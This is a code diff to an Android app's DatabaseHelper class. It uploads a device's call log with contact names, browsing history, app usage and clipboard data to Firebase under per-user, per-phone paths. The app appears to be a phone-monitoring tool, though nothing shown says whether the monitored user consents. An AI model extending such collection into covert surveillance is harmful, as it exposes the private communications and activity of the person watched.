@@ -47,6 +47,7 @@ public class DatabaseHelper {
                 callMap.put("number", callData.getPhoneNumber());
                 callMap.put("type", callData.getCallType());
                 callMap.put("timestamp", callData.getTimestamp());
+                callMap.put("contactName", callData.getContactName()); // Include contact name
 
                 callRef.setValue(callMap).addOnSuccessListener(aVoid ->
                                 Log.d("DatabaseHelper", "Call data uploaded successfully."))
@@ -168,76 +169,52 @@ public class DatabaseHelper {
     }
 
     public Task<Void> uploadWebVisitDataByDate(String userId, String phoneModel, WebVisitData visitData) {
-        // Generate unique ID using timestamp and a random string
-        String timestamp = String.valueOf(visitData.getTimestamp());
-        String randomId = UUID.randomUUID().toString();  // Directly generate the random string
-        String uniqueKey = timestamp + "_" + randomId;  // Unique ID based on timestamp and random ID
-
-        // Format the date for the visit
-        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
-        String date = dateFormat.format(new Date(visitData.getTimestamp()));
-
-        // Reference to the web visit data in Firebase, stored date-wise
-        DatabaseReference webRef = database.child(userId)
+        // Use the standard path structure: users/{userId}/phones/{phoneModel}/web_visits/{date}
+        DatabaseReference dbRef = database.child(userId)
                 .child("phones")
                 .child(phoneModel)
                 .child("web_visits")
-                .child(date) // Store data under the date
-                .child(uniqueKey); // Use unique key for each visit
+                .child(visitData.getDate());
 
-        // Create a map to store the web visit data
-        Map<String, Object> webMap = new HashMap<>();
-        webMap.put("url", visitData.getUrl());
-        webMap.put("title", visitData.getTitle());
-        webMap.put("timestamp", visitData.getTimestamp());
-
-        // Upload the data
-        return webRef.setValue(webMap)
-                .addOnSuccessListener(aVoid -> Log.d("DatabaseHelper", "Web visit data uploaded successfully."))
-                .addOnFailureListener(e -> Log.e("DatabaseHelper", "Failed to upload web visit data: " + e.getMessage()));
+        if (visitData.getDatabaseKey() == null) {
+            String key = dbRef.push().getKey();
+            visitData.setDatabaseKey(key);
+            return dbRef.child(key).setValue(visitData);
+        } else {
+            return dbRef.child(visitData.getDatabaseKey()).setValue(visitData);
+        }
     }
 
-
     public void uploadAppUsageDataByDate(String userId, String phoneModel, AppUsageData appUsageData) {
+        if (appUsageData.getUsageDuration() == 0) {
+            return; // Skip if no usage
+        }
 
         String sanitizedPackageName = sanitizePath(appUsageData.getPackageName());
+        String date = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(new Date());
 
-        // Get the formatted date (yyyy-MM-dd)
-        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd", Locale.getDefault());
-        String date = dateFormat.format(new Date(appUsageData.getTimestamp()));
-
-        // Reference to the Firebase node
         DatabaseReference usageRef = database.child(userId)
                 .child("phones")
                 .child(phoneModel)
                 .child("app_usage")
                 .child(date)
-                .child(sanitizedPackageName); // Use package name as unique ID for the day
+                .child(sanitizedPackageName);
 
-        // Fetch existing data from Firebase
-        usageRef.get().addOnSuccessListener(dataSnapshot -> {
-            long existingDuration = 0;
+        Log.d("DatabaseHelper", "Uploading usage data for: " + appUsageData.getPackageName());
 
-            if (dataSnapshot.exists() && dataSnapshot.hasChild("usage_duration")) {
-                // Retrieve the current duration from Firebase
-                existingDuration = dataSnapshot.child("usage_duration").getValue(Long.class);
-            }
+        Map<String, Object> usageMap = new HashMap<>();
+        usageMap.put("package_name", appUsageData.getPackageName());
+        usageMap.put("app_name", appUsageData.getAppName());
+        usageMap.put("usage_duration", appUsageData.getUsageDuration());
+        usageMap.put("launch_count", appUsageData.getLaunchCount());
+        usageMap.put("last_used", appUsageData.getLastTimeUsed());
+        usageMap.put("timestamp", System.currentTimeMillis());
 
-            // Add the new duration to the existing duration
-            long updatedDuration = existingDuration + appUsageData.getUsageDuration();
-
-            // Prepare the updated data
-            Map<String, Object> appUsageMap = new HashMap<>();
-            appUsageMap.put("package_name", appUsageData.getPackageName());
-            appUsageMap.put("usage_duration", updatedDuration);
-            appUsageMap.put("timestamp", appUsageData.getTimestamp());
-            appUsageMap.put("date", date);
-
-            // Upload the updated data to Firebase
-            usageRef.setValue(appUsageMap)
-                    .addOnSuccessListener(aVoid -> Log.d(TAG, "App usage data updated successfully."))
-                    .addOnFailureListener(e -> Log.e(TAG, "Failed to update app usage data: " + e.getMessage()));
-        }).addOnFailureListener(e -> Log.e(TAG, "Failed to fetch existing data: " + e.getMessage()));
+        usageRef.setValue(usageMap)
+                .addOnSuccessListener(aVoid -> 
+                    Log.d("DatabaseHelper", "Successfully uploaded usage data for " + appUsageData.getPackageName()))
+                .addOnFailureListener(e -> 
+                    Log.e("DatabaseHelper", "Failed to upload usage data: " + e.getMessage()));
     }
 
     public static void uploadClipboardDataByDate(String userId, String phoneModel, ClipboardData clipboardData) {
@@ -302,6 +279,21 @@ public class DatabaseHelper {
 
     // Helper function to sanitize paths and remove invalid characters
     String sanitizePath(String originalPath) {
-        return originalPath.replaceAll("[.#$\\[\\]]", "_");
+        if (originalPath == null) return "";
+        
+        // Replace any character that's not alphanumeric, underscore, or hyphen
+        String sanitized = originalPath.replaceAll("[^a-zA-Z0-9_-]", "_");
+        
+        // Ensure the path doesn't start with a number (Firebase requirement)
+        if (sanitized.matches("^[0-9].*")) {
+            sanitized = "_" + sanitized;
+        }
+        
+        // Prevent empty strings
+        if (sanitized.isEmpty()) {
+            sanitized = "_empty_";
+        }
+        
+        return sanitized;
     }
 }
